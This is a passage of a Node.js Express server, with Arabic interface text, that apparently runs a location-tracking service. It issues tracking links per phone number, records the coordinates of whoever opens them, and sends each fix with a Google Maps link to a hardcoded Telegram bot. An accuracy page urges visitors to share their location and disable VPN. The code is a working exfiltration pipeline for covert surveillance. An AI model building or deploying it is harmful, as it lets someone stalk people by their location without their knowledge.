                            <h4>دقة متوسطة (تحديد ذكي)</h4>
                            <p>• للمستخدمين العرب: موقع في بلد عربي واقعي</p>
                            <p>• دقة: 1-50 كم</p>
                            <p>• المصدر: تحليل اللغة والمنطقة الزمنية</p>
                        </div>
                    </div>
                    
                    <div class="accuracy-level low">
                        <div class="icon">🌍</div>
                        <div>
                            <h4>دقة منخفضة (IP عالمي)</h4>
                            <p>• للمستخدمين غير العرب أو بدون بيانات كافية</p>
                            <p>• دقة: 50-500 كم</p>
                            <p>• المصدر: عنوان IP العام</p>
                        </div>
                    </div>
                </div>
                
                <div class="info-card">
                    <h3>💡 نصائح لتحسين الدقة:</h3>
                    <p>1. <strong>اسمح للمتصفح بمشاركة الموقع</strong> عندما يطلب منك</p>
                    <p>2. <strong>أوقف تشغيل VPN</strong> إذا كنت تستخدمه</p>
                    <p>3. <strong>استخدم WiFi</strong> بدلاً من بيانات الجوال</p>
                    <p>4. <strong>تأكد من تفعيل خدمات الموقع</strong> في إعدادات هاتفك</p>
                </div>
                
                <a href="/" class="btn">🏠 العودة للرئيسية</a>
                <a href="/results" class="btn">📊 مشاهدة النتائج</a>
            </div>
        </body>
        </html>
    `);
});

// ========== اختبار التلجرام ==========
app.get('/telegram-test', async (req, res) => {
    try {
        // اختبار البوت
        const botTest = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/getMe`);
        const botInfo = await botTest.json();
        
        // إرسال رسالة اختبار
        const messageResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: `🔔 اختبار النظام الذكي\n\n✅ البوت: @Arab9919_bot\n🆔 الأيدي: ${TELEGRAM_CHAT_ID}\n⏰ الوقت: ${new Date().toLocaleString('ar-SA')}\n🌐 الموقع: ${BASE_URL}\n🎯 الدقة: نظام تحديد ذكي مفعل\n\nإذا وصلتك هذه الرسالة، النظام يعمل بشكل ممتاز! 🚀`
            })
        });
        
        const messageData = await messageResponse.json();
        
        res.send(`
            <!DOCTYPE html>
            <html dir="rtl">
            <head>
                <meta charset="UTF-8">
                <title>🤖 اختبار التلجرام</title>
                <style>
                    body { font-family: Arial; padding: 50px; background: #0f0f23; color: white; }
                    .result-box { background: #1a1a2e; padding: 30px; border-radius: 20px; margin: 20px 0; }
                    pre { background: #0f0f23; padding: 15px; border-radius: 10px; overflow-x: auto; }
                </style>
            </head>
            <body>
                <h1>🤖 اختبار التلجرام</h1>
                
                <div class="result-box">
                    <h3>✅ حالة النظام:</h3>
                    <p>البوت: @Arab9919_bot</p>
                    <p>الأيدي: ${TELEGRAM_CHAT_ID}</p>
                    <p>عدد المواقع: ${locations.length}</p>
                    <p>الحالة: ${messageData.ok ? '✅ يعمل بشكل ممتاز' : '❌ يحتاج تعديل'}</p>
                </div>
                
                <a href="/" style="background: #00cc66; color: white; padding: 15px 30px; border-radius: 10px; text-decoration: none;">🏠 العودة للرئيسية</a>
            </body>
            </html>
        `);
    } catch (error) {
        res.send(`
            <html dir="rtl">
            <body style="font-family: Arial; padding: 50px; background: #0f0f23; color: white;">
                <h1>❌ خطأ في اختبار التلجرام</h1>
                <p>تأكد من صحة التوكن والأيدي</p>
                <a href="/" style="background: #00cc66; color: white; padding: 15px 30px; border-radius: 10px; text-decoration: none;">العودة</a>
            </body>
            </html>
        `);
    }
});

// ========== دالة إرسال تلجرام ==========
async function sendTelegramNotification(locationData) {
    try {
        const message = `
📍 **موقع جديد تم تسجيله**

👤 **رقم المستخدم:** ${locationData.id}
📌 **الإحداثيات:** ${locationData.latitude.toFixed(6)}, ${locationData.longitude.toFixed(6)}
🎯 **مستوى الدقة:** ${locationData.quality === 'high' ? '🎯 عالية' : locationData.quality === 'medium' ? '📍 متوسطة' : '🌍 منخفضة'}
📡 **المصدر:** ${locationData.source || 'مباشر'}
⏰ **الوقت:** ${locationData.time}
📝 **ملاحظة:** ${locationData.note || 'لا توجد ملاحظات'}

🗺️ [فتح على Google Maps](https://maps.google.com/?q=${locationData.latitude},${locationData.longitude})
        `;
        
        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'Markdown'
            })
        });
        
        return response.ok;
    } catch (error) {
        console.error('❌ خطأ في التلجرام:', error);
        return false;
    }
}

// ========== تشغيل الخادم ==========
app.listen(PORT, () => {
    console.log(`
    ============================================
    🚀 النظام الذكي يعمل على المنفذ ${PORT}
    🌐 الرابط: http://localhost:${PORT}
    
    🤖 التلجرام: ✅ متصل (@Arab9919_bot)
    🎯 الدقة: ✅ نظام تحديد ذكي مفعل
    📱 الباركود: ✅ نشط
    🗺️ الخريطة: ✅ تفاعلية
    
    📌 روابط مهمة:
    1. الصفحة الرئيسية: /
    2. رابط تتبع: /track/رقم_الهاتف
    3. النتائج: /results
    4. معلومات الدقة: /accuracy-info
    
    ⚡ النظام جاهز بكل الميزات الذكية!
    ============================================
    `);
});
